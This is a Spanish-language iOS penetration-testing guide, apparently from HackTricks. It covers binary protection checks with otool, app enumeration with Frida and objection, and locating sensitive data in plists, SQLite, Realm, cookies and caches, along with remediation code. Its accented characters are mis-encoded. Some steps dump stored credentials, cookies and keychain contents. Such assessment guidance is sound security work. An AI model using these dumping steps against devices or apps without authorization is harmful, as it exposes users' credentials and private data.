# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking de AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceptos B√°sicos de iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Entorno de Pruebas

En esta p√°gina puedes encontrar informaci√≥n sobre el **simulador de iOS**, **emuladores** y **jailbreaking**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## An√°lisis Inicial

### Operaciones B√°sicas de Pruebas en iOS

Durante las pruebas **se sugerir√°n varias operaciones** (conectar al dispositivo, leer/escribir/subir/descargar archivos, usar algunas herramientas...). Por lo tanto, si no sabes c√≥mo realizar alguna de estas acciones, por favor, **comienza leyendo la p√°gina**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Para los siguientes pasos **la aplicaci√≥n debe estar instalada** en el dispositivo y ya se debe haber obtenido el **archivo IPA** de la aplicaci√≥n.\
Lee la p√°gina [Operaciones B√°sicas de Pruebas en iOS](basic-ios-testing-operations.md) para aprender c√≥mo hacer esto.
{% endhint %}

### An√°lisis Est√°tico B√°sico

Se recomienda usar la herramienta [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) para realizar un An√°lisis Est√°tico autom√°tico al archivo IPA.

Identificaci√≥n de **protecciones presentes en el binario**:

*   **PIE (Ejecutable Independiente de Posici√≥n)**: Cuando est√° habilitado, la aplicaci√≥n se carga en una direcci√≥n de memoria aleatoria cada vez que se inicia, lo que dificulta predecir su direcci√≥n de memoria inicial.

```bash
otool -hv <app-binary> | grep PIE   # Deber√≠a incluir la bandera PIE
```
*   **Canarios de Pila**: Para validar la integridad de la pila, se coloca un valor 'canario' en la pila antes de llamar a una funci√≥n y se valida nuevamente una vez que la funci√≥n termina.

```bash
otool -I -v <app-binary> | grep stack_chk   # Deber√≠a incluir los s√≠mbolos: stack_chk_guard y stack_chk_fail
```
*   **ARC (Conteo Autom√°tico de Referencias)**: Para prevenir fallos comunes de corrupci√≥n de memoria

```bash
otool -I -v <app-binary> | grep objc_release   # Deber√≠a incluir el s√≠mbolo _objc_release
```
*   **Binario Encriptado**: El binario deber√≠a estar encriptado

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # El cryptid deber√≠a ser 1
```

**Identificaci√≥n de Funciones Sensibles/Inseguras**

*   **Algoritmos de Hashing D√©biles**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# En linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Funciones Aleatorias Inseguras**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# En linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Funci√≥n ‚ÄòMalloc‚Äô Insegura**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_malloc"

# En linux
grep -iER "_malloc"
```
*   **Funciones Inseguras y Vulnerables**

```bash
# En el dispositivo iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# En linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### An√°lisis Din√°mico B√°sico

Consulta el an√°lisis din√°mico que realiza [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Necesitar√°s navegar a trav√©s de las diferentes vistas e interactuar con ellas, pero estar√° enganchando varias clases al hacer otras cosas y preparar√° un informe una vez que hayas terminado.

### Listado de Aplicaciones Instaladas

Cuando te enfoques en aplicaciones que est√°n instaladas en el dispositivo, primero tendr√°s que determinar el identificador de paquete correcto de la aplicaci√≥n que quieres analizar. Puedes usar `frida-ps -Uai` para obtener todas las aplicaciones (`-a`) actualmente instaladas (`-i`) en el dispositivo conectado por USB (`-U`):
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Enumeraci√≥n B√°sica y Hooking

Aprende c√≥mo **enumerar los componentes de la aplicaci√≥n** y c√≥mo **enganchar m√©todos y clases** f√°cilmente con objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Estructura de IPA

Los archivos `.ipa` son **paquetes comprimidos**, por lo que puedes cambiar la extensi√≥n a `.zip` y **descomprimirlos**. Una aplicaci√≥n **empaquetada** **completa** lista para ser instalada se conoce com√∫nmente como **Bundle**.\
Despu√©s de descomprimirlos deber√≠as ver `<NAME>.app`, un archivo comprimido que contiene el resto de los recursos.

* `Info.plist`: Un archivo que contiene algunas de las configuraciones espec√≠ficas de la aplicaci√≥n.
* `_CodeSignature/` contiene un archivo plist con una firma sobre todos los archivos en el bundle.
* `Assets.car`: Otro archivo comprimido que contiene activos (iconos).
* `Frameworks/` contiene las bibliotecas nativas de la aplicaci√≥n como archivos .dylib o .framework.
* `PlugIns/` puede contener extensiones de la aplicaci√≥n como archivos .appex (no presente en el ejemplo).
* [`Core Data`](https://developer.apple.com/documentation/coredata): Se utiliza para guardar los datos permanentes de tu aplicaci√≥n para uso sin conexi√≥n, para almacenar datos temporales y para agregar funcionalidad de deshacer a tu aplicaci√≥n en un solo dispositivo. Para sincronizar datos en m√∫ltiples dispositivos en una sola cuenta de iCloud, Core Data refleja autom√°ticamente tu esquema en un contenedor de CloudKit.
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): El archivo `PkgInfo` es una forma alternativa de especificar los c√≥digos de tipo y creador de tu aplicaci√≥n o bundle.
* **en.lproj, fr.proj, Base.lproj**: Son los paquetes de idiomas que contienen recursos para esos idiomas espec√≠ficos y un recurso predeterminado en caso de que un idioma no est√© soportado.

Hay m√∫ltiples formas de definir la UI en una aplicaci√≥n iOS: archivos _storyboard_, _nib_ o _xib_.

**Info.plist**

La lista de propiedades de informaci√≥n o `Info.plist` es la principal fuente de informaci√≥n para una app iOS. Consiste en un archivo estructurado que contiene pares **clave-valor** que describen informaci√≥n esencial de configuraci√≥n sobre la app. De hecho, se **espera que** todos los ejecutables empaquetados (extensiones de app, frameworks y apps) tengan un archivo `Info.plist`. Puedes encontrar todas las posibles claves en la [**Documentaci√≥n para Desarrolladores de Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

El archivo puede estar formateado en **XML o binario (bplist)**. Puedes **convertirlo a formato XML** con un simple comando:

*   En macOS con `plutil`, que es una herramienta que viene de forma nativa con macOS 10.2 y versiones superiores (actualmente no hay documentaci√≥n oficial en l√≠nea disponible):

```bash
$ plutil -convert xml1 Info.plist
```
*   En Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Aqu√≠ hay una lista no exhaustiva de alguna informaci√≥n y las correspondientes palabras clave que puedes buscar f√°cilmente en el archivo `Info.plist` simplemente inspeccionando el archivo o usando `grep -i <keyword> Info.plist`:

* Cadenas de prop√≥sito de permisos de la app: `UsageDescription`
* Esquemas de URL personalizados: `CFBundleURLTypes`
* Tipos de documentos personalizados exportados/importados: `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* Configuraci√≥n de App Transport Security (ATS): `NSAppTransportSecurity`

Por favor, consulta los cap√≠tulos mencionados para aprender m√°s sobre c√≥mo probar cada uno de estos puntos.

**Rutas de Datos**

En iOS, **las aplicaciones del sistema se pueden encontrar en el directorio `/Applications`** mientras que las apps **instaladas por el usuario** est√°n disponibles bajo **`/private/var/containers/`**. Sin embargo, encontrar la carpeta correcta solo navegando por el sistema de archivos no es una tarea trivial ya que **cada app recibe un UUID (Identificador √önico Universal) de 128 bits aleatorio** asignado para los nombres de sus directorios.

Para obtener f√°cilmente la informaci√≥n del directorio de instalaci√≥n de las apps instaladas por el usuario puedes usar el comando de **objection `env`** que tambi√©n te mostrar√° toda la informaci√≥n del directorio de la app:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Tambi√©n puedes buscar el nombre de la app dentro de **`/private/var/containers`**:
```bash
find /private/var/containers -name "Progname*"
```
O utilizando **`ps`** y **`lsof`**:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
Como puede ver, las aplicaciones tienen dos ubicaciones principales:

* El **directorio Bundle** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`).
* El **directorio de Datos** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`).

Estas carpetas contienen informaci√≥n que debe ser examinada detenidamente durante las evaluaciones de seguridad de aplicaciones (por ejemplo, al analizar los datos almacenados en busca de datos sensibles).

**Directorio Bundle:**

* **AppName.app**
* Este es el Bundle de Aplicaci√≥n como se vio anteriormente en el IPA, contiene datos esenciales de la aplicaci√≥n, contenido est√°tico as√≠ como el binario compilado de la aplicaci√≥n.
* Este directorio es visible para los usuarios, pero **los usuarios no pueden escribir en √©l**.
* El contenido de este directorio **no se respalda**.
* Los contenidos de esta carpeta se utilizan para **validar la firma de c√≥digo**.

**Directorio de Datos:**

* **Documents/**
* Contiene todos los datos generados por el usuario. El usuario final de la aplicaci√≥n inicia la creaci√≥n de estos datos.
* Visible para los usuarios y **los usuarios pueden escribir en √©l**.
* El contenido de este directorio **se respalda**.
* La aplicaci√≥n puede deshabilitar rutas estableciendo `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Contiene todos **los archivos que no son espec√≠ficos del usuario**, como **cach√©s**, **preferencias**, **cookies** y archivos de configuraci√≥n de lista de propiedades (plist).
* Las aplicaciones de iOS generalmente usan los subdirectorios `Application Support` y `Caches`, pero la aplicaci√≥n puede crear subdirectorios personalizados.
* **Library/Caches/**
* Contiene **archivos en cach√© semi-persistentes**.
* Invisible para los usuarios y **los usuarios no pueden escribir en √©l**.
* El contenido de este directorio **no se respalda**.
* El sistema operativo puede eliminar autom√°ticamente los archivos de este directorio cuando la aplicaci√≥n no est√° en funcionamiento y el espacio de almacenamiento es bajo.
* **Library/Application Support/**
* Contiene **archivos persistentes** necesarios para el funcionamiento de la aplicaci√≥n.
* **Invisible** para los usuarios y los usuarios no pueden escribir en √©l.
* El contenido de este directorio **se respalda**.
* La aplicaci√≥n puede deshabilitar rutas estableciendo `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Se utiliza para almacenar propiedades que pueden **persistir incluso despu√©s de que se reinicie una aplicaci√≥n**.
* La informaci√≥n se guarda, sin cifrar, dentro del sandbox de la aplicaci√≥n en un archivo plist llamado \[BUNDLE\_ID].plist.
* Todos los pares clave/valor almacenados usando `NSUserDefaults` se pueden encontrar en este archivo.
* **tmp/**
* Utilice este directorio para escribir **archivos temporales** que no necesitan persistir entre lanzamientos de la aplicaci√≥n.
* Contiene archivos en cach√© no persistentes.
* **Invisible** para los usuarios.
* El contenido de este directorio no se respalda.
* El sistema operativo puede eliminar autom√°ticamente los archivos de este directorio cuando la aplicaci√≥n no est√° en funcionamiento y el espacio de almacenamiento es bajo.

Echemos un vistazo m√°s de cerca al directorio Bundle de la Aplicaci√≥n iGoat-Swift (.app) dentro del directorio Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Inversi√≥n de Binarios

Dentro de la carpeta `<application-name>.app` encontrar√°s un archivo binario llamado `<application-name>`. Este es el archivo que ser√° **ejecutado**. Puedes realizar una inspecci√≥n b√°sica del binario con la herramienta **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Comprueba si la aplicaci√≥n est√° cifrada**

Verifica si hay alguna salida para:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Desensamblaje del binario**

Desensamble la secci√≥n de texto:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Para imprimir el **segmento Objective-C** de la aplicaci√≥n de muestra se puede usar:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Para obtener un c√≥digo Objective-C m√°s compacto puedes usar [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Sin embargo, las mejores opciones para desensamblar el binario son: [**Hopper**](https://www.hopperapp.com/download.html?) y [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, potenciados por las herramientas comunitarias **m√°s avanzadas**.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Almacenamiento de Datos

Para aprender sobre c√≥mo iOS almacena datos en el dispositivo, lee esta p√°gina:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Los siguientes lugares para almacenar informaci√≥n deben ser revisados **justo despu√©s de instalar la aplicaci√≥n**, **despu√©s de revisar todas las funcionalidades** de la aplicaci√≥n e incluso despu√©s de **cerrar sesi√≥n de un usuario y entrar con otro diferente**.\
El objetivo es encontrar **informaci√≥n sensible desprotegida** de la aplicaci√≥n (contrase√±as, tokens), del usuario actual y de usuarios previamente autenticados.
{% endhint %}

### Plist

Los archivos **plist** son archivos XML estructurados que **contienen pares clave-valor**. Es una forma de almacenar datos persistentes, por lo que a veces puedes encontrar **informaci√≥n sensible en estos archivos**. Se recomienda revisar estos archivos despu√©s de instalar la app y despu√©s de usarla intensivamente para ver si se escriben nuevos datos.

La forma m√°s com√∫n de persistir datos en archivos plist es a trav√©s del uso de **NSUserDefaults**. Este archivo plist se guarda dentro del sandbox de la app en **`Library/Preferences/<appBundleID>.plist`**

La clase [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) proporciona una interfaz program√°tica para interactuar con el sistema por defecto. El sistema por defecto permite que una aplicaci√≥n personalice su comportamiento de acuerdo a **preferencias del usuario**. Los datos guardados por `NSUserDefaults` pueden ser vistos en el paquete de la aplicaci√≥n. Esta clase almacena **datos** en un archivo **plist**, pero est√° pensada para ser usada con peque√±as cantidades de datos.

Estos datos ya no pueden ser accedidos directamente a trav√©s de un ordenador de confianza, pero pueden ser accedidos realizando un **backup**.

Puedes **volcar** la informaci√≥n guardada usando **`NSUserDefaults`** utilizando el comando de objection `ios nsuserdefaults get`

Para encontrar todos los plist utilizados por la aplicaci√≥n puedes acceder a `/private/var/mobile/Containers/Data/Application/{APPID}` y ejecutar:
```bash
find ./ -name "*.plist"
```
El archivo puede estar formateado en **XML o binario (bplist)**. Puedes **convertirlo a formato XML** con un simple comando:

*   En macOS con `plutil`, que es una herramienta que viene de forma nativa con macOS 10.2 y versiones superiores (actualmente no hay documentaci√≥n oficial en l√≠nea disponible):

```bash
$ plutil -convert xml1 Info.plist
```
*   En Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   En una sesi√≥n de objection:

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) es un marco de trabajo para gestionar la capa de modelo de objetos en tu aplicaci√≥n. [Core Data puede usar SQLite como su almac√©n persistente](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), pero el marco en s√≠ no es una base de datos.\
CoreData no cifra sus datos por defecto. Sin embargo, se puede a√±adir una capa de cifrado adicional a CoreData. Consulta el [Repositorio de GitHub](https://github.com/project-imas/encrypted-core-data) para m√°s detalles.

Puedes encontrar la informaci√≥n de Core Data SQLite de una aplicaci√≥n en la ruta `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Si puedes abrir SQLite y acceder a informaci√≥n sensible, entonces has encontrado una mala configuraci√≥n.**

{% code title="C√≥digo de iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) es un almac√©n de clave/valor construido sobre SQLite.\
Dado que las bases de datos Yap son bases de datos sqlite, puedes encontrarlas utilizando el comando propuesto en la secci√≥n anterior.

### Otras Bases de Datos SQLite

Es com√∫n que las aplicaciones creen su propia base de datos sqlite. Pueden estar **almacenando** **datos** **sensibles** en ellas y dejarlos sin cifrar. Por lo tanto, siempre es interesante revisar cada base de datos dentro del directorio de aplicaciones. Por lo tanto, ve al directorio de la aplicaci√≥n donde se guardan los datos (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bases de Datos Firebase en Tiempo Real

Puede ser aprovechada por desarrolladores de aplicaciones para **almacenar y sincronizar datos con una base de datos NoSQL alojada en la nube**. Los datos se almacenan como JSON y se sincronizan en tiempo real con cada cliente conectado y tambi√©n permanecen disponibles incluso cuando la aplicaci√≥n est√° fuera de l√≠nea.

Puedes encontrar c√≥mo verificar bases de datos Firebase mal configuradas aqu√≠:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bases de datos Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) y [Realm Swift](https://realm.io/docs/swift/latest/) no son suministrados por Apple, pero a√∫n as√≠ vale la pena mencionarlos. **Almacenan todo sin cifrar, a menos que la configuraci√≥n tenga el cifrado habilitado**.

Puedes encontrar estas bases de datos en `/private/var/mobile/Containers/Data/Application/{APPID}`
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Puedes usar la herramienta [**Realm Studio**](https://github.com/realm/realm-studio) para abrir estos archivos de base de datos.

El siguiente ejemplo demuestra c√≥mo usar encriptaci√≥n con una base de datos Realm:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bases de Datos Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) es un motor de base de datos embebido, ligero y orientado a documentos (NoSQL) que puede sincronizarse. Se compila de forma nativa para iOS y macOS.

Busca posibles bases de datos couchbase en `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`

### Cookies

iOS almacena las cookies de las aplicaciones en **`Library/Cookies/cookies.binarycookies`** dentro de la carpeta de cada aplicaci√≥n. Sin embargo, los desarrolladores a veces deciden guardarlas en el **keychain** ya que el mencionado **archivo de cookies puede ser accedido en copias de seguridad**.

Para inspeccionar el archivo de cookies puedes usar [**este script de python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) o usar el comando de objection **`ios cookies get`.**\
**Tambi√©n puedes usar objection para** convertir estos archivos a un formato JSON e inspeccionar los datos.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cach√©

Por defecto, NSURLSession almacena datos, como **solicitudes y respuestas HTTP en la base de datos Cache.db**. Esta base de datos puede contener **datos sensibles**, si tokens, nombres de usuario u otra informaci√≥n sensible ha sido almacenada en cach√©. Para encontrar la informaci√≥n en cach√©, abre el directorio de datos de la app (`/var/mobile/Containers/Data/Application/<UUID>`) y ve a `/Library/Caches/<Bundle Identifier>`. El **cach√© de WebKit tambi√©n se almacena en el archivo Cache.db**. **Objection** puede abrir e interactuar con la base de datos con el comando `sqlite connect Cache.db`, ya que es una **base de datos SQLite normal**.

Se **recomienda deshabilitar el almacenamiento en cach√© de estos datos**, ya que pueden contener informaci√≥n sensible en la solicitud o respuesta. La siguiente lista muestra diferentes maneras de lograr esto:

1. Se recomienda eliminar las respuestas almacenadas en cach√© despu√©s de cerrar sesi√≥n. Esto se puede hacer con el m√©todo proporcionado por Apple llamado [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Puedes llamar a este m√©todo de la siguiente manera:

`URLCache.shared.removeAllCachedResponses()`

Este m√©todo eliminar√° todas las solicitudes y respuestas almacenadas en cach√© del archivo Cache.db.
2. Si no necesitas utilizar las ventajas de las cookies, se recomendar√≠a simplemente usar la propiedad de configuraci√≥n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) de URLSession, la cual deshabilitar√° el guardado de cookies y cach√©s.

[Documentaci√≥n de Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Un objeto de configuraci√≥n de sesi√≥n ef√≠mera es similar a una configuraci√≥n de sesi√≥n predeterminada (ver default), excepto que el objeto de sesi√≥n correspondiente no almacena cach√©s, almacenes de credenciales, ni ning√∫n dato relacionado con la sesi√≥n en el disco. En cambio, los datos relacionados con la sesi√≥n se almacenan en RAM. La √∫nica vez que una sesi√≥n ef√≠mera escribe datos en el disco es cuando le indicas que escriba el contenido de una URL en un archivo.`
3. El cach√© tambi√©n puede deshabilitarse estableciendo la Pol√≠tica de Cach√© a [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Esto deshabilitar√° el almacenamiento de cach√© de cualquier forma, ya sea en memoria o en disco.

### Capturas de pantalla

Cada vez que presionas el bot√≥n de inicio, iOS **toma una captura de pantalla de la pantalla actual** para poder hacer la transici√≥n a la aplicaci√≥n de una manera mucho m√°s suave. Sin embargo, si **datos sensibles** est√°n presentes en la pantalla actual, estos ser√°n **guardados** en la **imagen** (que **persiste** **a trav√©s de** **reinicios**). Estas son las capturas de pantalla a las que tambi√©n puedes acceder presionando dos veces el bot√≥n de inicio para cambiar entre aplicaciones.

A menos que el iPhone est√© con jailbreak, el **atacante** necesita tener **acceso** al **dispositivo** **desbloqueado** para ver estas capturas de pantalla. Por defecto, la √∫ltima captura de pantalla se almacena en el sandbox de la aplicaci√≥n en la carpeta `Library/Caches/Snapshots/` o `Library/SplashBoard/Snapshots` (los ordenadores de confianza no pueden acceder al sistema de archivos desde iOX 7.0).

Una manera de prevenir este mal comportamiento es colocar una pantalla en blanco o eliminar los datos sensibles antes de tomar la captura de pantalla usando la funci√≥n `ApplicationDidEnterBackground()`.

El siguiente es un m√©todo de remediaci√≥n de muestra que establecer√° una captura de pantalla predeterminada.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objetivo-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Esto establece la imagen de fondo a `overlayImage.png` cada vez que la aplicaci√≥n se minimiza. Evita fugas de datos sensibles porque `overlayImage.png` siempre sobrescribir√° la vista actual.

### Llavero

Herramientas como [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) pueden ser utilizadas para volcar el llavero (el dispositivo debe estar con jailbreak).\
